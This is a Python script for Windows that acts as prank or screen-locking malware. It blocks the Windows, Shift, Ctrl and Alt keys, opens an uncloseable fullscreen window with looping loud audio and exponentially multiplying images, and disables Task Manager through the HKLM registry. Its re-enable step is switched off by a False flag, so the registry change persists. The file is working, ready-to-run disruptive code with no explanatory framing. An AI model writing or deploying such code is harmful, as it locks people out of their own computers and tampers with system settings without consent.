"""/////////////////////////////"""

from tkinter import *
import keyboard
from random import *
from pygame import mixer
import winreg as reg




"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""

TaskMgr = False

"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""




keyboard.block_key('windows')
keyboard.block_key('shift')
keyboard.block_key('ctrl')
keyboard.block_key('alt')

"""/////////////////////////////"""

mixer.init()
root = Tk()
root.iconbitmap("icon.ico")
root.title("Screen")
root.attributes("-fullscreen", True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
png = PhotoImage(file="image.png")
ImageWidth = png.width()
ImageHeight = png.height()

ScreenWidth = root.winfo_screenwidth()
ScreenHeight = root.winfo_screenheight()
pngs = []

"""/////////////////////////////"""

mixer.music.load("audio.mp3")
mixer.music.set_volume(1)
mixer.music.play(-1)

PNGScreen = Canvas(root, width=ScreenWidth, height=ScreenHeight)
PNGScreen.pack()
PNG = PNGScreen.create_image(ScreenWidth // 2, ScreenHeight // 2, image=png)
pngs.append(PNG)

"""/////////////////////////////"""

def DisableTaskManager():

    RegPath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, RegPath, 0, reg.KEY_SET_VALUE)
    except FileNotFoundError:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, RegPath)

    reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
    reg.CloseKey(key)
    
def EnableTaskManager():
    if TaskMgr == True:
        RegPath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, RegPath, 0, reg.KEY_SET_VALUE)
        except FileNotFoundError:
            key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, RegPath)
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 0)
        reg.CloseKey(key)

def Duplicate():
    global pngs
    new_pngs = []
    for original_png in list(pngs):
        x, y = PNGScreen.coords(original_png)
        if x and y:
            NewPng = PNGScreen.create_image(x, y, image=png)
            new_pngs.append(NewPng)
    pngs.extend(new_pngs)
    root.after(1400, Duplicate)

def Moving():
    for png_item in list(pngs): 
        coords = PNGScreen.coords(png_item)
        x, y = coords

        mx = randint(-100, 100)
        my = randint(-100, 100)

        neWx = min(max(x + mx, ImageWidth // 2), ScreenWidth - ImageWidth // 2)
        neWy = min(max(y + my, ImageHeight // 2), ScreenHeight - ImageHeight // 2)

        PNGScreen.coords(png_item, neWx, neWy)

            
    root.after(100, Moving)  

"""/////////////////////////////"""

DisableTaskManager()
Moving()
root.after(3000, Duplicate)
root.after(10000, EnableTaskManager)
root.mainloop()

 